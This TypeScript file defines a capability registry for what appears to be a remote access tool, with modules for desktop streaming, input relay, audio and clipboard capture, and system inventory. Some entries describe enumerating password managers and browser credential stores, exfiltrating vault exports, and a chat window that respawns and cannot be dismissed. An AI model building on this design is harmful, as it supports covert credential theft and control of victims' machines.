export interface AgentModuleCapability {
  id: string;
  name: string;
  description: string;
}

export interface AgentModuleDefinition {
  id: string;
  title: string;
  description: string;
  commands: string[];
  capabilities: AgentModuleCapability[];
}

export const agentModules: AgentModuleDefinition[] = [
  {
    id: "remote-desktop",
    title: "Remote Desktop",
    description:
      "Interactive remote desktop streaming and operator input relay.",
    commands: ["remote-desktop"],
    capabilities: [
      {
        id: "remote-desktop.stream",
        name: "Desktop streaming",
        description:
          "Stream high-fidelity desktop frames to the controller UI.",
      },
      {
        id: "remote-desktop.input",
        name: "Input relay",
        description:
          "Relay keyboard and pointer events back to the remote host.",
      },
      {
        id: "remote-desktop.transport.quic",
        name: "QUIC transport",
        description:
          "Provide QUIC transport negotiation for resilient input streams.",
      },
      {
        id: "remote-desktop.codec.hevc",
        name: "HEVC encoding",
        description:
          "Enable hardware-accelerated HEVC streaming when supported.",
      },
      {
        id: "remote-desktop.metrics",
        name: "Performance telemetry",
        description:
          "Collect frame quality and adaptive bitrate metrics for dashboards.",
      },
    ],
  },
  {
    id: "audio-control",
    title: "Audio Control",
    description:
      "Capture and inject audio for synchronized operator coordination.",
    commands: ["audio-control"],
    capabilities: [
      {
        id: "audio.capture",
        name: "Audio capture",
        description:
          "Capture remote system audio for monitoring and recording.",
      },
      {
        id: "audio.inject",
        name: "Audio injection",
        description:
          "Inject operator-provided audio streams into the remote session.",
      },
    ],
  },
  {
    id: "clipboard",
    title: "Clipboard Manager",
    description:
      "Synchronize clipboard contents between the operator and remote workstation.",
    commands: ["clipboard"],
    capabilities: [
      {
        id: "clipboard.capture",
        name: "Clipboard capture",
        description:
          "Capture clipboard changes emitted by the remote workstation.",
      },
      {
        id: "clipboard.push",
        name: "Clipboard push",
        description: "Push operator clipboard payloads to the remote host.",
      },
    ],
  },
  {
    id: "recovery",
    title: "Recovery Operations",
    description: "Stage, track, and collect recovery payloads across modules.",
    commands: ["recovery"],
    capabilities: [
      {
        id: "recovery.queue",
        name: "Recovery queue",
        description:
          "Queue recovery jobs for background execution and monitoring.",
      },
      {
        id: "recovery.collect",
        name: "Artifact collection",
        description:
          "Collect artifacts staged by upstream modules for exfiltration.",
      },
      {
        id: "vault.export",
        name: "Vault export collection",
        description:
          "Stage and exfiltrate vault exports via the recovery pipeline.",
      },
    ],
  },
  {
    id: "client-chat",
    title: "Client Chat",
    description:
      "Persistent two-way chat channel that the client cannot dismiss locally.",
    commands: ["client-chat"],
    capabilities: [
      {
        id: "client-chat.persistent",
        name: "Persistent window",
        description:
          "Keep the chat interface open continuously and respawn it if terminated.",
      },
      {
        id: "client-chat.alias",
        name: "Alias control",
        description:
          "Allow the controller to update operator and client aliases in real time.",
      },
    ],
  },
  {
    id: "system-info",
    title: "System Information",
    description:
      "Collect host metadata, hardware configuration, and telemetry snapshots.",
    commands: ["system-info"],
    capabilities: [
      {
        id: "system-info.snapshot",
        name: "System snapshot",
        description:
          "Produce structured operating system and hardware inventories.",
      },
      {
        id: "system-info.telemetry",
        name: "System telemetry",
        description:
          "Surface live telemetry metrics used by scheduling and recovery modules.",
      },
      {
        id: "vault.enumerate",
        name: "Vault enumeration",
        description:
          "Enumerate installed password managers and browser credential stores.",
      },
    ],
  },
  {
    id: "notes",
    title: "Incident Notes",
    description:
      "Secure local note taking synchronized with the controller vault.",
    commands: ["notes.sync"],
    capabilities: [
      {
        id: "notes.sync",
        name: "Notes sync",
        description:
          "Synchronize local incident notes to the operator vault with delta compression.",
      },
    ],
  },
];

export type AgentModuleId = (typeof agentModules)[number]['id'];

export const agentModuleIndex: ReadonlyMap<AgentModuleId, AgentModuleDefinition> =
  new Map(agentModules.map((module) => [module.id, module]));

export const agentModuleIds: ReadonlySet<AgentModuleId> = new Set(
  agentModules.map((module) => module.id),
);

type AgentModuleCapabilityRecord = AgentModuleCapability & {
  moduleId: string;
  moduleTitle: string;
};

const capabilityEntries: [string, AgentModuleCapabilityRecord][] = [];

for (const module of agentModules) {
  for (const capability of module.capabilities) {
    capabilityEntries.push([
      capability.id,
      {
        ...capability,
        moduleId: module.id,
        moduleTitle: module.title,
      },
    ]);
  }
}

export const agentModuleCapabilityIndex: ReadonlyMap<
  string,
  AgentModuleCapabilityRecord
> = new Map(capabilityEntries);

export const agentModuleCapabilityIds: ReadonlySet<string> = new Set(
  capabilityEntries.map(([id]) => id),
);
